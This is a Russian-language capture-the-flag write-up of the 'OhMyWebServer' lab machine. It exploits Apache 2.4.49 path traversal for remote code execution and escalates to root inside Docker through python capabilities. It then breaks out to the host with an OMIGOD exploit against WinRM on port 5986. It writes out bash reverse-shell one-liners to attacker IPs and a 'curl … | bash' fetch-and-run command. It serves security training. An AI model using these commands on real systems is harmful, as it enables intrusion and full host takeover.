# OhMyWebServer WriteUp (Medium)‚úÖ

–ü–µ—Ä–µ–π–¥—è –ø–æ ip –∞–¥—Ä–µ—Å—É –º—ã –ø–æ–ø–∞–¥–∞–µ–º –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü—É –∫–∞–∫–æ–≥–æ-—Ç–æ —Å–∞–π—Ç–∞, —Å–≤—è–∑–∞–Ω–æ–≥–æ —Å –∫–æ–Ω—Å–∞–ª—Ç–∏–Ω–≥–æ–≤—ã–º–∏ —É—Å–ª—É–≥–∞–º–∏

<figure><img src="../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

–ü—Ä–æ—Å–∫–∞–Ω–∏—Ä–æ–≤–∞–≤ –ø–æ—Ä—Ç—ã, –º—ã –º–æ–¥–µ–º —É–∑–Ω–∞—Ç—å —á—Ç–æ –Ω–∞ 80 –ø–æ—Ä—Ç–µ –Ω–∞—Ö–æ–¥–∏—Ç—Å—è **Apache-HTTP —Å–µ—Ä–≤–µ—Ä**, –ø—Ä–∏ —á–µ–º –≤–µ—Ä—Å–∏—è Apache - **2.4.49**

<figure><img src="../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

–ó–∞–π–¥—è –Ω–∞ —Å–∞–π—Ç exploit-db.com –∏ –ø—Ä–æ–≥—É–≥–ª–∏–≤ –¥–∞–Ω–Ω—É—é –≤–µ—Ä—Å–∏—é –ü–û Apache, –º—ã –º–æ–∂–µ–º –Ω–∞–π—Ç–∏ —ç–∫—Å–ø–ª–æ–π—Ç, —Å –ø–æ–º–æ—â—å—é –∫–æ—Ç–æ—Ä–æ–≥–æ —Å–º–æ–∂–µ–º —É–¥–∞–ª–µ–Ω–Ω–æ –≤—ã–ø–æ–ª–Ω—è—Ç—å –∫–æ–¥

<figure><img src="../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

–°–∫–∞—á–∏–≤–∞–µ–º –¥–∞–Ω–Ω—ã–π —ç–∫—Å–ø–æ–π—Ç –∏ —Ç–µ—Å—Ç–∏—Ä—É–µ–º –µ–≥–æ —Ä–∞–±–æ—Ç—É

<figure><img src="../.gitbook/assets/image (26) (1).png" alt=""><figcaption><p>–ü–µ—Ä–µ–¥ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º —Å–∫—Ä–∏–ø—Ç–∞ —è —Å–æ–∑–¥–∞–ª —Ç–µ–∫—Å—Ç–æ–≤—ã–π —Ñ–∞–π–ª <strong>ip.txt</strong>, –∫—É–¥–∞ –≤–ø–∏—Å–∞–ª ip –∞–¥—Ä–µ—Å –º–∞—à–∏–Ω—ã üìå</p></figcaption></figure>

–ï—Å–ª–∏ –º—ã –º–æ–∂–µ–º —Å –ø–æ–º–æ—â—å—é –¥–∞–Ω–Ω–æ–≥–æ —ç–∫—Å–ø–ª–æ–π—Ç–∞ –≤—ã–ø–æ–ª–Ω—è—Ç—å –∫–∞–∫–∏–µ-–ª–∏–±–æ –∫–æ–º–∞–Ω–¥—ã, —Ç–æ, —Å–ª–µ–¥–æ–≤–∞—Ç–µ–ª—å–Ω–æ, –≤–º–µ—Å—Ç–æ –∫–æ–º–∞–Ω–¥—ã ls –º–æ–∂–Ω–æ –≤–ø–∏—Å–∞—Ç—å [**bash\_reverse\_shell**](https://www.revshells.com/) –∏ –ø–æ–ª—É—á–∏—Ç—å –æ–±–æ–ª–æ—á–∫—É –Ω–∞—à–µ–π –º–∞—à–∏–Ω—ã

–ü–æ–¥–∫–ª—é—á–∏–≤ —Å–ª—É—à–∞—Ç–µ–ª—å –∑–∞—Ä–∞–Ω–µ–µ, –≤—ã–ø–æ–ª–Ω—è–µ–º –∫–æ–º–∞–Ω–¥—É

`./50383.sh ip.txt /bin/sh 'bash -c "bash -i >& /dev/tcp/10.17.5.130/5555 0>&1"'`

–∏ –ø–æ–ª—É—á–∞–µ–º —à–µ–ª–ª –æ—Ç –ª–∏—Ü–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è **daemon**

<figure><img src="../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (4) (4).png" alt=""><figcaption><p>–°—É–¥—è –ø–æ —Å—Ç—Ä–∞–Ω–Ω–æ–º—É –Ω–∞–±–æ—Ä—É –±—É–∫–≤ –∏ —Ü–∏—Ñ—Ä –ø–æ—Å–ª–µ –∏–º–µ–Ω–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è, –º—ã –Ω–∞—Ö–æ–¥–∏–º—Å—è –≤ –¥–æ–∫–µ—Ä–µ üìå</p></figcaption></figure>

<figure><img src="../.gitbook/assets/image (8).png" alt=""><figcaption><p>linpeas —ç—Ç–æ –ø–æ–¥—Ç–≤–µ—Ä–¥–∏–ª üìå</p></figcaption></figure>

–ü–µ—Ä–≤—ã–π —Ñ–ª–∞–≥, –≤–µ—Ä–æ—è—Ç–Ω–µ–µ –≤—Å–µ–≥–æ, –Ω–∞—Ö–æ–¥–∏—Ç—Å—è –≤ –ø–∞–ø–∫–µ root, –Ω–æ –º—ã –Ω–µ –∏–º–µ–µ–º –ø—Ä–∞–≤, —á—Ç–æ–±—ã –≤ –Ω–µ—ë –ø–µ—Ä–µ–π—Ç–∏, –ø–æ—ç—Ç–æ–º—É –ø—Ä–∏–¥—ë—Ç—Å—è –≤—ã–ø–æ–ª–Ω—è—Ç—å —ç—Å–∫–∞–ª–∞—Ü–∏—é –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π –∏ –ø–æ–ª—É—á–∞—Ç—å **root**'a

C –ø–æ–º–æ—â—å—é linpeas'a –º—ã —É–∑–Ω–∞—ë–º, —á—Ç–æ –º–æ–∂–µ–º –ø—Ä–æ—ç–∫—Å–ø–ª—É–∞—Ç–∏—Ä–æ–≤–∞—Ç—å [**python capabilities**](https://gtfobins.github.io/gtfobins/python/), —Å –ø–æ–º–æ—â—å—é –∫–æ–º–∞–Ω–¥—ã `python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'` –ø–æ–ª—É—á–∞–µ–º **root**'a –≤ –¥–æ–∫–µ—Ä–µ&#x20;

<figure><img src="../.gitbook/assets/image (1) (2).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>

–û—Å—Ç–∞—ë—Ç—Å—è –ª–∏—à—å –≤—ã–≤–µ—Å—Ç–∏ —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ —Ñ–∞–π–ª–∞ user.txt –∏ –ø–æ–ª—É—á–∏—Ç—å –ø–µ—Ä–≤—ã–π —Ñ–ª–∞–≥üö©

<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

–ù–∏—á–µ–≥–æ, –∫—Ä–æ–º–µ –≤–Ω—É—Ç—Ä–µ–Ω–Ω–µ–≥–æ ip-–∞–¥—Ä–µ—Å–∞ linpeas –Ω–µ –Ω–∞—à—ë–ª, –ø–æ—ç—Ç–æ–º—É –∑–∞–≥—Ä—É–∂–∞–µ–º —Å–∫–∞–Ω–µ—Ä nmap –∏ —Å–∫–∞–Ω–∏—Ä—É–µ–º –ø–æ—Ä—Ç—ã (—Å–∫–∞–Ω–∏—Ä–æ–≤–∞—Ç—å –º—ã –±—É–¥–µ–º ip 172.12.0.1, —Ç.–∫. 0.2 - —ç—Ç–æ –Ω–∞—à –∞–¥—Ä–µ—Å, –∞ –ø—Ä–µ–¥—ã–¥—É—â–∏–π - —Ö–æ—Å—Ç–∞)

<figure><img src="../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

–í–∏–¥–∏–º –æ—Ç–∫—Ä—ã—Ç—ã–π 5986-–π –ø–æ—Ä—Ç, –∫–æ—Ç–æ—Ä—ã–π –æ—Ç–Ω–æ—Å–∏—Ç—Å—è –∫ **Windows Remote Management**

–î–∞–Ω–Ω—ã–π —Å–µ—Ä–≤–∏—Å –∏–º–µ–µ—Ç —É—è–∑–≤–∏–º–æ—Å—Ç—å, –∫–æ—Ç–æ—Ä—É—é –º—ã –º–æ–∂–µ–º –ø—Ä–æ—ç–∫—Å–ø–ª—É–∞—Ç–∏—Ä–æ–≤–∞—Ç—å —Å –ø–æ–º–æ—â—å—é **omigod**-—ç–∫—Å–ø–æ–π—Ç–∞

–ó–∞–≥—Ä—É–∂–∞–µ–º –µ–≥–æ –≤ –ø–∞–ø–∫—É /tmp

–ü–µ—Ä–µ–¥ —ç–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏–µ–π —É—è–∑–≤–∏–º–æ—Å—Ç–∏ —Å–æ–∑–¥–∞–¥–∏–º –Ω–∞ —Å–æ–±—Å—Ç–≤–µ–Ω–Ω–æ–π –º–∞—à–∏–Ω–µ –≤ –ø–∞–ø–∫–µ /tmp —Ñ–∞–π–ª shell.sh, –≥–¥–µ –±—É–¥–µ—Ç —Ö—Ä–∞–Ω–∏—Ç—å—Å—è bash\_rev\_shell(`bash -i >& dev/tcp/self_ip/6666 0>&1`)

<figure><img src="../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

–í —Ç–æ–π –∂–µ –ø–∞–ø–∫–µ /tmp –ø–æ–¥–∫–ª—é—á–∞–µ–º **python3**-—Å–µ—Ä–≤–µ—Ä (port - **3333**)

–ó–∞–ø—É—Å–∫–∞–µ–º —Å–ª—É—à–∞—Ç–µ–ª—å `nc -lvnp`` `**`6666`** –Ω–∞ —Å–≤–æ–µ–π –º–∞—à–∏–Ω–µ

–ù–∞ –∞—Ç–∞–∫—É–µ–º–æ–π –º–∞—à–∏–Ω–µ –≤ –ø–∞–ø–∫–µ /tmp –≤—ã–ø–æ–ª–Ω—è–µ–º –∫–æ–º–∞–Ω–¥—É

&#x20;`python3 name_of_exploit -t 172.17.0.1 -c "curl self_ip:3333/`[`shell.sh`](https://vk.com/away.php?to=http%3A%2F%2Fshell.sh\&cc\_key=) `| bash"`

<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

–ö–∞–∫ –∏—Ç–æ–≥, –º—ã –≤—ã–±—Ä–∞–ª–∏—Å—å –∏–∑ –¥–æ–∫–µ—Ä–∞ –∏ –ø–æ–ª—É—á–∏–ª–∏ —à–µ–ª–ª –æ—Å–Ω–æ–≤–Ω–æ–≥–æ —Å–µ—Ä–≤–µ—Ä–∞ –∞—Ç–∞–∫—É–µ–º–æ–π –º–∞—à–∏–Ω—ã, –æ—Å—Ç–∞—ë—Ç—Å—è –ª–∏—à—å –≤—ã–≤–µ—Å—Ç–∏ —Ñ–ª–∞–≥ **root.txt**

<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
